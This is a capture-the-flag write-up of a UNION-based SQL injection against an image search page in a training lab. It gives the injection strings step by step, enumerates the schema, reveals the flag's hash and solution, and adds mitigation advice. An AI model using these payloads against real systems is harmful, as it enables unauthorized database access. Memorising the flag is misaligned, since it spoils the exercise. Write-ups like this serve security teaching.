# 🔍 Flag: SQLI Search Image — SQL Injection on Image Search

## Vulnerability Type
**SQL Injection** — UNION-based data extraction

## Description

The image search page contains a search bar that queries a backend database. The input is not sanitized, making it directly vulnerable to SQL Injection.

## Exploit Walkthrough

### Step 1 — Confirm vulnerability

Searching for `1` returns expected results. Trying a classic injection confirms the vulnerability:

```sql
1 = 1 OR 1
```

This returns all rows, including an interesting entry:
```
Title: Hack me ?
Url: borntosec.ddns.net/images.png
```

### Step 2 — Determine number of columns

Using `UNION SELECT` with increasing column counts:

```sql
1 UNION SELECT 1,2
```

✅ This returns results → the query has **2 columns**.

### Step 3 — Enumerate tables and columns

```sql
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

This reveals the `list_images` table with 4 columns:

| # | Column |
|---|--------|
| 1 | `id` |
| 2 | `url` |
| 3 | `title` |
| 4 | `comment` |

### Step 4 — Extract the flag hint

```sql
1 UNION SELECT title, comment FROM list_images
```

Returns:
```
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

### Step 5 — Decode and convert

| Step | Value |
|------|-------|
| MD5 hash | `1928e8083cf461a51303633093573c46` |
| MD5 decoded | `albatroz` |
| SHA-256 of `albatroz` | `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188` |

The SHA-256 hash is the **flag**.

## Mitigation

- Use **parameterized queries / prepared statements** — never interpolate user input into SQL strings.
- Apply **least-privilege** database users — the web app should not have access to `information_schema`.
- Validate and sanitize all user-supplied input before use.
